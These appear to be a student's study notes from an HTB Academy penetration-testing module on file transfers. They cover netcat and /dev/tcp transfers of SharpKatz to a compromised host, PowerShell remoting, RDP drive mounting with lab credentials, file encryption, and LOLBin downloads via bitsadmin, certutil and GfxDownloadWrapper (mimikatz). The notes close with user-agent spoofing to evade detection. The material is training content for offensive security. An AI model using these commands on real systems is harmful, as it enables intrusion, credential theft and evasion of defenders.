#### NetCat - Compromised Machine - Listening on Port 8000
```shell
# Example using Original Netcat
nc -l -p 8000 > SharpKatz.exe
# Example using Ncat
ncat -l -p 8000 --recv-only > SharpKatz.exe
```
#### Netcat - Attack Host - Sending File to Compromised machine

```shell
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
# Netcat
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# NCAT
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.
#### Attack Host - Sending File as Input to Netcat

```shell
# Attack host
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# Compromised Machine
nc 192.168.49.128 443 > SharpKatz.exe
```

>[!Important]
>Con `< SharpKatz.exe`, en vez de que netcat espere tu teclado, **lee el contenido binario del archivo SharpKatz.exe como si fuera lo que ibas a teclear**, y automáticamente **envía todo ese contenido** al cliente en cuanto se conecta.

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
## PowerShell Session File Transfer

We already talked about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
### Example
We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

```powershell
est-NetConnection -ComputerName DATABASE01 -Port 5985
```
Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.
#### Create a PowerShell Remoting Session to DATABASE01

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```
We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

```powershell
## Copy samplefile.txt from our Localhost to the DATABASE01 Session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
## Copy DATABASE.txt from DATABASE01 Session to our Localhost
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
## RDP

RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.
#### Mounting a Linux Folder

```shell
# rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
# xfreerdp
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

![Windows File Explorer showing a network folder named 'tsclient' with a subfolder 'linux'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/tsclient.jpg)

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.

![Remote Desktop Connection settings showing options for configuring remote audio, keyboard shortcuts, and local resources like printers and drives.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/rdp.png)

After selecting the drive, we can interact with it in the remote session that follows.
## Exercise
### Use xfreerdp or rdesktop to connect to the target machine via RDP (Username: htb-student | Password:HTB_@cademy_stdnt!) and mount a Linux directory to practice file transfer operations (upload and download) with your attack host.

```shell
xfreerdp /v:10.129.180.176 /d:HTB /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,/home/ayelaldo/Desktop/HTB/CPTS/FileTransfer
```
# Protected File Transfers
## File Encryption on Windows

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.

```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"

Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="

Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin

Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
```

Full script: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1

We can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.

```powershell
Import-Module .\Invoke-AESEncryption.ps1
```
## File Encryption on Linux

[OpenSSL](https://www.openssl.org/) is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files.

To encrypt a file using `openssl` we can select different ciphers, see [OpenSSL man page](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html). Let's use `-aes256` as an example. We can also override the default iterations counts with the option `-iter 100000` and add the option `-pbkdf2` to use the Password-Based Key Derivation Function 2 algorithm. When we hit enter, we'll need to provide a password.

```shell
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

```shell
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```
# Living off The Land

The phrase "Living off the land" was coined by Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) & Matt Graeber [@mattifestation](https://twitter.com/mattifestation) at [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).

The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

This section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows & Linux systems.
## Other Common Living off the Land tools

### Bitsadmin Download function

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.
#### File Download with Bitsadmin

```powershell
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

```shell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
### Certutil

Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.
#### Download a File with Certutil

```powershell
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

>[!Important]
>We have to create an http server before

# Evading Detection

## Changing User Agent

If diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.
#### Listing out User Agents

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

# List of the available User-agents
```
Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
#### Request with Chrome User Agent

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
## LOLBAS / GTFOBins

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries". An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:
#### Transferring File with GfxDownloadWrapper.exe

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.